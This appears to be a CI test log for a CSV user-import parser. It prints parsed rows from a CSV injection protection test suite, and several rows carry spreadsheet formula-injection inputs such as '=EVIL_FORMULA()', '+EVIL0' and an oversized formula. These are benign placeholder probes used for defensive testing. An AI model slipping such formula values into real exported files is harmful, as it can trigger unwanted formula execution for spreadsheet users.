2025-11-18T17:35:41.5820978Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5821410Z     role: [33m3[39m,
2025-11-18T17:35:41.5821788Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5822174Z     password: [33m-1[39m
2025-11-18T17:35:41.5822508Z   }
2025-11-18T17:35:41.5822757Z }
2025-11-18T17:35:41.5823105Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5823647Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5824199Z   firstName: [32m'First\rLine'[39m,
2025-11-18T17:35:41.5824718Z   lastName: [32m'Last\rLine'[39m,
2025-11-18T17:35:41.5825171Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5825637Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5825989Z }
2025-11-18T17:35:41.5826130Z 
2025-11-18T17:35:41.5828038Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mNewline Character Protection[2m > [22m[2mshould handle mixed newline characters[22m[39m
2025-11-18T17:35:41.5829407Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5830359Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5831588Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5832490Z }
2025-11-18T17:35:41.5833801Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5834780Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5835256Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5836321Z   cellValues: [ [32m'test@example.com'[39m, [32m'First\r\nLine'[39m, [32m'Last\n\rLine'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5837372Z   columnMapping: {
2025-11-18T17:35:41.5837823Z     email: [33m0[39m,
2025-11-18T17:35:41.5838255Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5838721Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5839190Z     role: [33m3[39m,
2025-11-18T17:35:41.5839605Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5840025Z     password: [33m-1[39m
2025-11-18T17:35:41.5840377Z   }
2025-11-18T17:35:41.5840652Z }
2025-11-18T17:35:41.5841045Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5841652Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5842236Z   firstName: [32m'First\r\nLine'[39m,
2025-11-18T17:35:41.5842790Z   lastName: [32m'Last\n\rLine'[39m,
2025-11-18T17:35:41.5843264Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5843748Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5844119Z }
2025-11-18T17:35:41.5844271Z 
2025-11-18T17:35:41.5846039Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle empty fields safely[22m[39m
2025-11-18T17:35:41.5847662Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5848666Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5849941Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5850654Z }
2025-11-18T17:35:41.5852014Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5853011Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5853470Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5854315Z   cellValues: [ [32m'test@example.com'[39m, [32m''[39m, [32m''[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5854981Z   columnMapping: {
2025-11-18T17:35:41.5855386Z     email: [33m0[39m,
2025-11-18T17:35:41.5855788Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5856218Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5856625Z     role: [33m3[39m,
2025-11-18T17:35:41.5857203Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5857597Z     password: [33m-1[39m
2025-11-18T17:35:41.5857947Z   }
2025-11-18T17:35:41.5858206Z }
2025-11-18T17:35:41.5858585Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5859180Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5859717Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5860192Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5860649Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5861188Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5861589Z }
2025-11-18T17:35:41.5861920Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5862389Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5863264Z   cellValues: [ [32m'user@example.com'[39m, [32m''[39m, [32m''[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5863932Z   columnMapping: {
2025-11-18T17:35:41.5864318Z     email: [33m0[39m,
2025-11-18T17:35:41.5864703Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5865110Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5865507Z     role: [33m3[39m,
2025-11-18T17:35:41.5865906Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5866325Z     password: [33m-1[39m
2025-11-18T17:35:41.5866682Z   }
2025-11-18T17:35:41.5867173Z }
2025-11-18T17:35:41.5867562Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5868155Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5868929Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5869397Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5869878Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5870418Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5870813Z }
2025-11-18T17:35:41.5870976Z 
2025-11-18T17:35:41.5872716Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle fields with only formula characters[22m[39m
2025-11-18T17:35:41.5874150Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5875177Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5876515Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5877466Z }
2025-11-18T17:35:41.5878870Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5879928Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5880458Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5881362Z   cellValues: [ [32m'test@example.com'[39m, [32m'='[39m, [32m'+'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5882064Z   columnMapping: {
2025-11-18T17:35:41.5882511Z     email: [33m0[39m,
2025-11-18T17:35:41.5883181Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5883681Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5884125Z     role: [33m3[39m,
2025-11-18T17:35:41.5884566Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5884994Z     password: [33m-1[39m
2025-11-18T17:35:41.5885347Z   }
2025-11-18T17:35:41.5885611Z }
2025-11-18T17:35:41.5886000Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5886612Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5887363Z   firstName: [32m'='[39m,
2025-11-18T17:35:41.5887827Z   lastName: [32m'+'[39m,
2025-11-18T17:35:41.5888290Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5888810Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5889191Z }
2025-11-18T17:35:41.5889528Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5890024Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5890934Z   cellValues: [ [32m'user@example.com'[39m, [32m'-'[39m, [32m'@'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5891642Z   columnMapping: {
2025-11-18T17:35:41.5892101Z     email: [33m0[39m,
2025-11-18T17:35:41.5892561Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5893038Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5893489Z     role: [33m3[39m,
2025-11-18T17:35:41.5893861Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5894224Z     password: [33m-1[39m
2025-11-18T17:35:41.5894524Z   }
2025-11-18T17:35:41.5894751Z }
2025-11-18T17:35:41.5895074Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5895553Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5895983Z   firstName: [32m'-'[39m,
2025-11-18T17:35:41.5896353Z   lastName: [32m'@'[39m,
2025-11-18T17:35:41.5896727Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5897347Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5897719Z }
2025-11-18T17:35:41.5897878Z 
2025-11-18T17:35:41.5899625Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle fields with formula characters in middle[22m[39m
2025-11-18T17:35:41.5901061Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5902100Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5903427Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5904159Z }
2025-11-18T17:35:41.5905579Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5906737Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5907653Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5908699Z   cellValues: [ [32m'test@example.com'[39m, [32m'John=Doe'[39m, [32m'Smith+Johnson'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5909492Z   columnMapping: {
2025-11-18T17:35:41.5909938Z     email: [33m0[39m,
2025-11-18T17:35:41.5910379Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5910855Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5911294Z     role: [33m3[39m,
2025-11-18T17:35:41.5911701Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5912120Z     password: [33m-1[39m
2025-11-18T17:35:41.5912491Z   }
2025-11-18T17:35:41.5912756Z }
2025-11-18T17:35:41.5913150Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5913756Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5914351Z   firstName: [32m'John=Doe'[39m,
2025-11-18T17:35:41.5914909Z   lastName: [32m'Smith+Johnson'[39m,
2025-11-18T17:35:41.5915410Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5915989Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5916403Z }
2025-11-18T17:35:41.5916740Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5917418Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5918421Z   cellValues: [ [32m'user@example.com'[39m, [32m'Jane-Smith'[39m, [32m'Bob@Work'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5919213Z   columnMapping: {
2025-11-18T17:35:41.5919661Z     email: [33m0[39m,
2025-11-18T17:35:41.5920330Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5920850Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5921286Z     role: [33m3[39m,
2025-11-18T17:35:41.5921710Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5922167Z     password: [33m-1[39m
2025-11-18T17:35:41.5922538Z   }
2025-11-18T17:35:41.5922802Z }
2025-11-18T17:35:41.5923174Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5923761Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5924391Z   firstName: [32m'Jane-Smith'[39m,
2025-11-18T17:35:41.5924992Z   lastName: [32m'Bob@Work'[39m,
2025-11-18T17:35:41.5925522Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5926025Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5926400Z }
2025-11-18T17:35:41.5926562Z 
2025-11-18T17:35:41.5928663Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle quoted fields with formula characters[22m[39m
2025-11-18T17:35:41.5930107Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5931113Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5932419Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5933150Z }
2025-11-18T17:35:41.5934538Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5935559Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5936095Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5937323Z   cellValues: [ [32m'test@example.com'[39m, [32m'=SUM(A1:A10)'[39m, [32m'Normal Name'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5938133Z   columnMapping: {
2025-11-18T17:35:41.5938583Z     email: [33m0[39m,
2025-11-18T17:35:41.5939031Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5939479Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5939910Z     role: [33m3[39m,
2025-11-18T17:35:41.5940340Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5940783Z     password: [33m-1[39m
2025-11-18T17:35:41.5941164Z   }
2025-11-18T17:35:41.5941441Z }
2025-11-18T17:35:41.5941832Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5942445Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5943067Z   firstName: [32m'=SUM(A1:A10)'[39m,
2025-11-18T17:35:41.5943658Z   lastName: [32m'Normal Name'[39m,
2025-11-18T17:35:41.5944200Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5944744Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5945411Z }
2025-11-18T17:35:41.5945769Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5946316Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5947569Z   cellValues: [ [32m'user@example.com'[39m, [32m'Normal'[39m, [32m'=EVIL_FORMULA()'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5948430Z   columnMapping: {
2025-11-18T17:35:41.5948891Z     email: [33m0[39m,
2025-11-18T17:35:41.5949330Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5949817Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5950240Z     role: [33m3[39m,
2025-11-18T17:35:41.5950659Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5951108Z     password: [33m-1[39m
2025-11-18T17:35:41.5951481Z   }
2025-11-18T17:35:41.5951748Z }
2025-11-18T17:35:41.5952149Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5952760Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5953355Z   firstName: [32m'Normal'[39m,
2025-11-18T17:35:41.5953938Z   lastName: [32m'=EVIL_FORMULA()'[39m,
2025-11-18T17:35:41.5954496Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5955026Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5955425Z }
2025-11-18T17:35:41.5955590Z 
2025-11-18T17:35:41.5957420Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle very long formula injections[22m[39m
2025-11-18T17:35:41.5958805Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5960083Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5961499Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5962257Z }
2025-11-18T17:35:41.5963691Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5964732Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5965233Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5965609Z   cellValues: [
2025-11-18T17:35:41.5966060Z     [32m'test@example.com'[39m,
2025-11-18T17:35:41.6006247Z     [32m'=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(B1:B1000)'[39m,
2025-11-18T17:35:41.6044683Z     [32m'Normal'[39m,
2025-11-18T17:35:41.6045141Z     [32m'docente'[39m
2025-11-18T17:35:41.6045487Z   ],
2025-11-18T17:35:41.6045800Z   columnMapping: {
2025-11-18T17:35:41.6046241Z     email: [33m0[39m,
2025-11-18T17:35:41.6046705Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6047402Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6047845Z     role: [33m3[39m,
2025-11-18T17:35:41.6048223Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6048638Z     password: [33m-1[39m
2025-11-18T17:35:41.6048999Z   }
2025-11-18T17:35:41.6049268Z }
2025-11-18T17:35:41.6049659Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6050279Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.6089471Z   firstName: [32m'=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(B1:B1000)'[39m,
2025-11-18T17:35:41.6126094Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.6126623Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6127384Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6127793Z }
2025-11-18T17:35:41.6127966Z 
2025-11-18T17:35:41.6129922Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mPerformance and Security[2m > [22m[2mshould handle large CSV with many formula attempts efficiently[22m[39m
2025-11-18T17:35:41.6131515Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.6132795Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.6134173Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.6134922Z }
2025-11-18T17:35:41.6136306Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.6137633Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6138176Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6139180Z   cellValues: [ [32m'user0@example.com'[39m, [32m'=SUM(A1:A0)'[39m, [32m'+EVIL0'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6139960Z   columnMapping: {
2025-11-18T17:35:41.6140390Z     email: [33m0[39m,
2025-11-18T17:35:41.6140809Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6141277Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6141713Z     role: [33m3[39m,
2025-11-18T17:35:41.6142125Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6142557Z     password: [33m-1[39m
2025-11-18T17:35:41.6142930Z   }
2025-11-18T17:35:41.6143212Z }
2025-11-18T17:35:41.6143605Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6144217Z   email: [32m'user0@example.com'[39m,
2025-11-18T17:35:41.6144840Z   firstName: [32m'=SUM(A1:A0)'[39m,
2025-11-18T17:35:41.6145405Z   lastName: [32m'+EVIL0'[39m,
2025-11-18T17:35:41.6145891Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6146407Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6146990Z }
2025-11-18T17:35:41.6147355Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6147851Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6148832Z   cellValues: [ [32m'user1@example.com'[39m, [32m'=SUM(A1:A1)'[39m, [32m'+EVIL1'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6149602Z   columnMapping: {
2025-11-18T17:35:41.6150051Z     email: [33m0[39m,
2025-11-18T17:35:41.6150481Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6150919Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6151366Z     role: [33m3[39m,
2025-11-18T17:35:41.6151772Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6152204Z     password: [33m-1[39m
2025-11-18T17:35:41.6152571Z   }
2025-11-18T17:35:41.6152854Z }
2025-11-18T17:35:41.6153259Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6153897Z   email: [32m'user1@example.com'[39m,
2025-11-18T17:35:41.6154512Z   firstName: [32m'=SUM(A1:A1)'[39m,
2025-11-18T17:35:41.6155103Z   lastName: [32m'+EVIL1'[39m,
2025-11-18T17:35:41.6155595Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6156109Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6157009Z }
2025-11-18T17:35:41.6157384Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6157918Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6158942Z   cellValues: [ [32m'user2@example.com'[39m, [32m'=SUM(A1:A2)'[39m, [32m'+EVIL2'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6159740Z   columnMapping: {
2025-11-18T17:35:41.6160180Z     email: [33m0[39m,
2025-11-18T17:35:41.6160665Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6161149Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6161615Z     role: [33m3[39m,
2025-11-18T17:35:41.6162031Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6162449Z     password: [33m-1[39m
2025-11-18T17:35:41.6162814Z   }
2025-11-18T17:35:41.6163101Z }
2025-11-18T17:35:41.6163499Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6164104Z   email: [32m'user2@example.com'[39m,
2025-11-18T17:35:41.6164740Z   firstName: [32m'=SUM(A1:A2)'[39m,
2025-11-18T17:35:41.6165329Z   lastName: [32m'+EVIL2'[39m,
2025-11-18T17:35:41.6165849Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6166401Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6167001Z }
2025-11-18T17:35:41.6167380Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6167645Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6168403Z   cellValues: [ [32m'user3@example.com'[39m, [32m'=SUM(A1:A3)'[39m, [32m'+EVIL3'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6168573Z   columnMapping: {
2025-11-18T17:35:41.6169029Z     email: [33m0[39m,
2025-11-18T17:35:41.6169286Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6169494Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6169679Z     role: [33m3[39m,
2025-11-18T17:35:41.6169879Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6170091Z     password: [33m-1[39m
2025-11-18T17:35:41.6170225Z   }
2025-11-18T17:35:41.6170348Z }
2025-11-18T17:35:41.6170603Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6170933Z   email: [32m'user3@example.com'[39m,
2025-11-18T17:35:41.6171215Z   firstName: [32m'=SUM(A1:A3)'[39m,
2025-11-18T17:35:41.6171499Z   lastName: [32m'+EVIL3'[39m,
2025-11-18T17:35:41.6171718Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6171997Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6172120Z }
2025-11-18T17:35:41.6172319Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6172537Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6173284Z   cellValues: [ [32m'user4@example.com'[39m, [32m'=SUM(A1:A4)'[39m, [32m'+EVIL4'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6173441Z   columnMapping: {
2025-11-18T17:35:41.6173641Z     email: [33m0[39m,
2025-11-18T17:35:41.6173868Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6174068Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6174257Z     role: [33m3[39m,
2025-11-18T17:35:41.6174440Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6174639Z     password: [33m-1[39m
2025-11-18T17:35:41.6174761Z   }
2025-11-18T17:35:41.6174875Z }
